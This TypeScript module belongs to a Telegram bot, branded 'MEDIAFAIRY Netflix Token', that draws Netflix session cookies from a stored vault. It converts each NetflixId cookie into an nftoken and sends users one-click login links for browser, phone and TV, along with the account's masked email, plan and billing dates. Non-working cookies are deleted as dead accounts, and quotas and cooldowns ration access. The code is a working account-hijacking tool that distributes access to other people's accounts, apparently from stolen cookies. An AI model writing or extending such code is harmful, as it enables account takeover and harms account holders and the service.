import type { Bot } from './bot';
import type { GenAction, RegionFilter, VaultEntry } from './types';
import { adminContact, escapeHtml } from './telegram';
import { getStats, remainingQuota } from './stats';
import { extractCookieDict, extractMetadata, fetchNfToken, maskEmail } from './netflix';

const REGION_KEYWORDS: Record<Exclude<RegionFilter, 'global'>, string[]> = {
  sea: ['id', 'sg', 'my', 'ph', 'th', 'vn', 'indonesia', 'malaysia', 'singapore', 'philippines', 'thailand', 'vietnam'],
  asia: [
    'jp', 'kr', 'tw', 'hk', 'in', 'tr',
    'japan', 'korea', 'taiwan', 'hong', 'india', 'turkey',
    'id', 'sg', 'my', 'ph', 'th', 'vn',
    'indonesia', 'malaysia', 'singapore', 'philippines', 'thailand', 'vietnam',
  ],
  europe: ['gb', 'uk', 'fr', 'de', 'es', 'it', 'nl', 'se', 'france', 'germany', 'spain', 'italy', 'netherlands', 'sweden'],
  america: ['us', 'ca', 'br', 'ar', 'mx', 'united states', 'canada', 'brazil', 'mexico', 'argentina'],
};

function matchRegion(regionText: string, keywords: string[]): boolean {
  return keywords.some((c) => new RegExp(`\\b${c}\\b`).test(regionText));
}

function filterVaultByRegion(vault: VaultEntry[], regionFilter: RegionFilter): VaultEntry[] {
  if (regionFilter === 'global') return vault;
  const keywords = REGION_KEYWORDS[regionFilter];
  if (!keywords) return vault;
  return vault.filter((v) => {
    const r = (v.region || 'Tidak diketahui').toLowerCase();
    return matchRegion(r, keywords);
  });
}

export async function processGeneration(
  bot: Bot,
  chatId: number,
  userId: number,
  username: string,
  isAdmin: boolean,
  inputData: string | null,
  action: GenAction,
  regionFilter: RegionFilter | null
): Promise<void> {
  const stats = await getStats(bot, userId);

  if (!isAdmin && stats.lastGen) {
    const waitMs = bot.cfg.COOLDOWN_MS - (Date.now() - stats.lastGen);
    if (waitMs > 0) {
      const sec = Math.ceil(waitMs / 1000);
      await bot.send(
        chatId,
        `⏳ <b>Mohon tunggu ${sec} detik</b> sebelum generate berikutnya.\nJeda antar generate: <b>1 menit</b>.`
      );
      return;
    }
  }

  if (remainingQuota(stats, bot.cfg.FREE_DAILY_LIMIT) <= 0) {
    await bot.send(
      chatId,
      `⛔ <b>Akses Ditolak: Limit Habis!</b>\nAnda telah menggunakan seluruh batas Harian (${bot.cfg.FREE_DAILY_LIMIT}x) dan Kuota Ekstra Anda kosong.\n\n🎁 Dapatkan kuota ekstra dengan bergabung & verifikasi di channel kami, atau hubungi admin: ${adminContact(bot.cfg)}.`
    );
    return;
  }

  if (!isAdmin) stats.lastGen = Date.now();

  await bot.send(
    chatId,
    `🔄 Memverifikasi${regionFilter ? ` dengan filter Region: <b>${regionFilter.toUpperCase()}</b>` : ''}... mohon tunggu.`
  );

  try {
    const vault = (await bot.kv.getVault()) || [];
    let nfToken: string | null = null;
    let expires: number | null = null;
    let meta: ReturnType<typeof extractMetadata> | null = null;

    if (action === 'random') {
      if (vault.length === 0) {
        await bot.send(chatId, '⚠️ <b>Maaf, Vault saat ini kosong.</b>');
        return;
      }

      let filteredVault = regionFilter ? filterVaultByRegion(vault, regionFilter) : vault;

      if (filteredVault.length === 0) {
        await bot.send(
          chatId,
          `⚠️ <b>Stock Habis!</b>\nTidak ditemukan akun yang sesuai dengan region <b>${(regionFilter || 'Semua').toUpperCase()}</b> di Vault saat ini.`
        );
        return;
      }

      const maxAttempts = 5;
      let success = false;
      let accountsRemoved = 0;
      const deadIds = new Set<number>();

      for (let i = 0; i < maxAttempts; i++) {
        if (filteredVault.length === 0) break;

        const randomIdx = Math.floor(Math.random() * filteredVault.length);
        const candidate = filteredVault[randomIdx];
        const cookieDict = extractCookieDict(candidate.rawText);

        if (!cookieDict.NetflixId) {
          filteredVault.splice(randomIdx, 1);
          deadIds.add(candidate.id);
          accountsRemoved++;
          continue;
        }

        try {
          const tokenData = await fetchNfToken(cookieDict.NetflixId);
          nfToken = tokenData.token;
          expires = tokenData.expires;
          meta = extractMetadata(candidate.rawText);
          success = true;
          break;
        } catch {
          filteredVault.splice(randomIdx, 1);
          deadIds.add(candidate.id);
          accountsRemoved++;
        }
      }

      if (deadIds.size > 0) {
        await bot.kv.setVault(vault.filter((v) => !deadIds.has(v.id)));
      }

      if (!success) {
        await bot.send(
          chatId,
          `❌ <b>Semua Sampel Acak Mati!</b>\nSistem otomatis menguji dan <b>menghapus ${accountsRemoved} akun mati</b> dari sistem. Silakan klik 🎲 <b>Generate Random</b> lagi untuk menguji antrean akun berikutnya.`
        );
        return;
      }
    } else {
      let finalCookieText = inputData || '';
      if (/^\d+$/.test(finalCookieText)) {
        const savedCookie = vault.find((v) => v.id == Number(finalCookieText));
        if (!savedCookie) {
          await bot.send(chatId, `❌ Cookie dengan ID <b>${finalCookieText}</b> tidak ditemukan.`);
          return;
        }
        finalCookieText = savedCookie.rawText;
      }

      const cookieDict = extractCookieDict(finalCookieText);
      if (!cookieDict.NetflixId) {
        await bot.send(chatId, '❌ <b>Gagal:</b> <code>NetflixId</code> tidak ditemukan dalam input.');
        return;
      }

      const tokenData = await fetchNfToken(cookieDict.NetflixId);
      nfToken = tokenData.token;
      expires = tokenData.expires;
      meta = extractMetadata(finalCookieText);
    }

    if (!nfToken || !expires || !meta) throw new Error('Gagal mengambil token.');

    const loginBrowser = 'https://netflix.com/?nftoken=' + nfToken;
    const loginMobile = 'https://netflix.com/unsupported?nftoken=' + nfToken;
    const loginTv = 'https://netflix.com/tv2?nftoken=' + nfToken;
    const expDate = new Date(expires).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const maskedEmail = maskEmail(meta.email);
    const premiumOutput =
      `✅ <b>Token Netflix Berhasil Dibuat</b>\n\n` +
      `📧 <b>Email:</b> ${escapeHtml(maskedEmail)}\n` +
      `🌍 <b>Region:</b> ${escapeHtml(meta.region)}\n` +
      `💎 <b>Plan:</b> ${escapeHtml(meta.plan)}\n` +
      `🗓 <b>Member Since:</b> ${escapeHtml(meta.memberSince)}\n` +
      `⏳ <b>Next Billing:</b> ${escapeHtml(meta.nextBilling)}\n\n` +
      `💻 <b>Login Browser</b>\n<a href="${loginBrowser}">➡️ Klik disini</a>\n\n` +
      `📱 <b>Login Hp</b>\n<a href="${loginMobile}">➡️ Klik disini</a>\n\n` +
      `📺 <b>Login TV</b>\n<a href="${loginTv}">➡️ Klik disini</a>\n\n` +
      `⏳ <b>Expires:</b> <code>${expDate}</code>\n\n` +
      `<b>MEDIAFAIRY Netflix Token</b>`;

    await bot.send(chatId, premiumOutput);

    if (!isAdmin) {
      if (stats.used < bot.cfg.FREE_DAILY_LIMIT) stats.used += 1;
      else stats.extra = Math.max(0, (stats.extra || 0) - 1);
      await bot.kv.setStats(userId, stats);

      try {
        const notifMsg =
          `<b>NETFLIX GENERATED</b>\n<pre><code class="language-txt">👤 User   : ${escapeHtml(username)}\n🆔 ID     : ${userId}\n📧 Email  : ${escapeHtml(maskedEmail)}\n🌍 Region : ${escapeHtml(meta.region)}\n💎 Plan   : ${escapeHtml(meta.plan)}</code></pre>`;
        await bot.api('sendMessage', { chat_id: bot.cfg.GROUP_ID, text: notifMsg, parse_mode: 'HTML' });
      } catch (e) {
        console.error('Gagal mengirim notif:', e);
      }
    }
  } catch (e) {
    await bot.send(chatId, `❌ <b>Terjadi Kesalahan:</b>\n<code>${escapeHtml((e as Error).message)}</code>`);
  }
}